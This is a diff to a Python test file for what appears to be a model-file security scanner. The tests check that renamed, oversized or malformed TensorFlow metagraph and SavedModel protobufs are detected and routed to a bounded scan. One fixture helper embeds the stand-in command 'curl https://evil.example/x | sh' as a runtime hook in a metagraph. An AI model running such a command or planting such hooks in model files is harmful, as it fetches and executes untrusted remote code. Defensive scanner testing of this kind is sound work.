@@ -92,6 +92,16 @@ def _build_tf_metainfo_bytes() -> bytes:
     return cast(bytes, metagraph.meta_info_def.SerializeToString())
 
 
+def _build_tf_collection_only_metagraph_bytes() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.graph_def.SetInParent()
+    metagraph.collection_def["runtime_hook"].bytes_list.value.append(b"curl https://evil.example/x | sh")
+    return cast(bytes, metagraph.SerializeToString())
+
+
 def _encode_proto_varint(value: int) -> bytes:
     out = bytearray()
     while value >= 0x80:
@@ -519,6 +529,19 @@ def test_detect_tf_metagraph_by_strict_parse(tmp_path: Path) -> None:
     assert validate_file_type(str(metagraph_path)) is True
 
 
+def test_detect_tf_metagraph_pb_suffix_validates_when_routed_by_content(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    metagraph_path = tmp_path / "graph.pb"
+    metagraph_path.write_bytes(_build_tf_metagraph_bytes())
+
+    assert detect_format_from_extension(str(metagraph_path)) == "protobuf"
+    assert detect_file_format(str(metagraph_path)) == "tf_metagraph"
+    assert detect_file_format_from_magic(str(metagraph_path)) == "tf_metagraph"
+    assert validate_file_type(str(metagraph_path)) is True
+
+
 def test_detect_renamed_tf_metagraph_by_strict_parse_without_promoting_generic_protobuf(tmp_path: Path) -> None:
     if not _has_tf_protos():
         pytest.skip("TensorFlow protobuf stubs unavailable")
@@ -553,27 +576,77 @@ def test_detect_renamed_tf_savedmodel_by_strict_parse_without_promoting_generic_
     assert detect_file_format(str(generic_protobuf)) == "unknown"
 
 
+def test_detect_renamed_tf_metagraph_routes_collection_only_structure(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    collection_only_metagraph = tmp_path / "collection-only.jpg"
+    collection_only_metagraph.write_bytes(_build_tf_collection_only_metagraph_bytes())
+
+    assert detect_file_format_from_magic(str(collection_only_metagraph)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(collection_only_metagraph)) == "tf_metagraph"
+    assert detect_file_format(str(collection_only_metagraph)) == "tf_metagraph"
+
+
+def test_detect_renamed_tf_protobuf_rejects_empty_graph_node_near_match(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    empty_node_metagraph = tmp_path / "empty-node-metagraph.jpg"
+    empty_node_savedmodel = tmp_path / "empty-node-savedmodel.jpg"
+    empty_node_metagraph.write_bytes(_proto_length_field(2, b"\x0a\x00"))
+    empty_node_savedmodel.write_bytes(_proto_length_field(2, _proto_length_field(2, b"\x0a\x00")))
+
+    assert detect_file_format_from_magic(str(empty_node_metagraph)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(empty_node_metagraph)) == "unknown"
+    assert detect_file_format(str(empty_node_metagraph)) == "unknown"
+    assert detect_file_format_from_magic(str(empty_node_savedmodel)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(empty_node_savedmodel)) == "unknown"
+    assert detect_file_format(str(empty_node_savedmodel)) == "unknown"
+
+
 def test_detect_oversized_renamed_tf_protobuf_rejects_malformed_field_two_payload(tmp_path: Path) -> None:
     malformed_payload = tmp_path / "malformed-large.jpg"
-    malformed_payload.write_bytes(b"\x12" + (b"x" * (20 * 1024 * 1024)))
-    generic_payload = tmp_path / "generic-large.jpg"
-    generic_payload.write_bytes(b"\x12\x81\x80\x80\x0a" + (b"x" * (20 * 1024 * 1024 + 1)))
+    malformed_payload.write_bytes(b"\x12\x81\x80\x80\x0a" + (b"x" * 1024))
 
     assert detect_file_format_from_magic(str(malformed_payload)) == "unknown"
     assert detect_file_format_for_skip_filter(str(malformed_payload)) == "unknown"
     assert detect_file_format(str(malformed_payload)) == "unknown"
-    assert detect_file_format_from_magic(str(generic_payload)) == "unknown"
-    assert detect_file_format_for_skip_filter(str(generic_payload)) == "unknown"
-    assert detect_file_format(str(generic_payload)) == "unknown"
 
 
-def test_detect_renamed_tf_probe_budget_exhaustion_stays_unknown(tmp_path: Path) -> None:
+def test_detect_oversized_renamed_tf_field_two_routes_to_bounded_scan(tmp_path: Path) -> None:
+    generic_payload = tmp_path / "generic-large.jpg"
+    generic_payload.write_bytes(b"\x12\x81\x80\x80\x0a" + (b"x" * (20 * 1024 * 1024 + 1)))
+
+    assert detect_file_format_from_magic(str(generic_payload)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(generic_payload)) == "tf_metagraph"
+    assert detect_file_format(str(generic_payload)) == "tf_metagraph"
+
+
+def test_detect_renamed_tf_probe_budget_exhaustion_routes_to_bounded_scan(tmp_path: Path) -> None:
     generic_payload = tmp_path / "many-fields.jpg"
-    generic_payload.write_bytes(b"".join(_proto_varint_field(3, index) for index in range(4100)))
+    generic_payload.write_bytes(b"".join(_proto_varint_field(3, index) for index in range(33000)))
 
-    assert detect_file_format_from_magic(str(generic_payload)) == "unknown"
-    assert detect_file_format_for_skip_filter(str(generic_payload)) == "unknown"
-    assert detect_file_format(str(generic_payload)) == "unknown"
+    assert detect_file_format_from_magic(str(generic_payload)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(generic_payload)) == "tf_metagraph"
+    assert detect_file_format(str(generic_payload)) == "tf_metagraph"
+
+
+def test_detect_renamed_tf_nested_probe_budget_exhaustion_routes_to_bounded_scan(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    nested_group_payload = tmp_path / "nested-budget.jpg"
+    nested_group_payload.write_bytes(
+        _encode_proto_varint((99 << 3) | 3)
+        + b"".join(_proto_varint_field(3, index) for index in range(33000))
+        + _encode_proto_varint((99 << 3) | 4)
+        + _build_tf_metagraph_bytes()
+    )
+
+    assert detect_file_format_from_magic(str(nested_group_payload)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(nested_group_payload)) == "tf_metagraph"
+    assert detect_file_format(str(nested_group_payload)) == "tf_metagraph"
 
 
 def test_detect_oversized_renamed_tf_savedmodel_routes_to_bounded_scan(tmp_path: Path) -> None:
@@ -583,6 +656,21 @@ def test_detect_oversized_renamed_tf_savedmodel_routes_to_bounded_scan(tmp_path:
     oversized_savedmodel = tmp_path / "saved-large.jpg"
     seed = _build_tf_savedmodel_bytes()
     oversized_savedmodel.write_bytes(seed + (b"x" * (20 * 1024 * 1024 + 1 - len(seed))))
+
+    assert detect_file_format_from_magic(str(oversized_savedmodel)) == "tf_savedmodel"
+    assert detect_file_format_for_skip_filter(str(oversized_savedmodel)) == "tf_savedmodel"
+    assert detect_file_format(str(oversized_savedmodel)) == "tf_savedmodel"
+
+
+def test_detect_oversized_renamed_tf_savedmodel_metagraph_routes_to_bounded_scan(tmp_path: Path) -> None:
+    oversized_savedmodel = tmp_path / "saved-oversized-metagraph.jpg"
+    oversized_metagraph_size = 20 * 1024 * 1024 + 1
+    oversized_savedmodel.write_bytes(
+        _proto_varint_field(1, 1)
+        + _encode_proto_varint((2 << 3) | 2)
+        + _encode_proto_varint(oversized_metagraph_size)
+        + (b"x" * oversized_metagraph_size)
+    )
 
     assert detect_file_format_from_magic(str(oversized_savedmodel)) == "tf_metagraph"
     assert detect_file_format_for_skip_filter(str(oversized_savedmodel)) == "tf_metagraph"
@@ -604,9 +692,9 @@ def test_detect_oversized_renamed_tf_savedmodel_continues_past_empty_metagraph(t
     )
     savedmodel.write_bytes(payload + (b"x" * (20 * 1024 * 1024 + 1 - len(payload))))
 
-    assert detect_file_format_from_magic(str(savedmodel)) == "tf_metagraph"
-    assert detect_file_format_for_skip_filter(str(savedmodel)) == "tf_metagraph"
-    assert detect_file_format(str(savedmodel)) == "tf_metagraph"
+    assert detect_file_format_from_magic(str(savedmodel)) == "tf_savedmodel"
+    assert detect_file_format_for_skip_filter(str(savedmodel)) == "tf_savedmodel"
+    assert detect_file_format(str(savedmodel)) == "tf_savedmodel"
 
 
 def test_detect_oversized_renamed_tf_metagraph_with_metadata_routes_to_bounded_scan(tmp_path: Path) -> None:
@@ -620,6 +708,18 @@ def test_detect_oversized_renamed_tf_metagraph_with_metadata_routes_to_bounded_s
         + _encode_proto_varint((2 << 3) | 2)
         + _encode_proto_varint(oversized_graph_size)
         + (b"x" * oversized_graph_size)
+    )
+
+    assert detect_file_format_from_magic(str(oversized_metagraph)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(oversized_metagraph)) == "tf_metagraph"
+    assert detect_file_format(str(oversized_metagraph)) == "tf_metagraph"
+
+
+def test_detect_oversized_renamed_tf_metagraph_graph_only_routes_to_bounded_scan(tmp_path: Path) -> None:
+    oversized_metagraph = tmp_path / "graph-only-large.jpg"
+    oversized_graph_size = 20 * 1024 * 1024 + 1
+    oversized_metagraph.write_bytes(
+        _encode_proto_varint((2 << 3) | 2) + _encode_proto_varint(oversized_graph_size) + (b"x" * oversized_graph_size)
     )
 
     assert detect_file_format_from_magic(str(oversized_metagraph)) == "tf_metagraph"
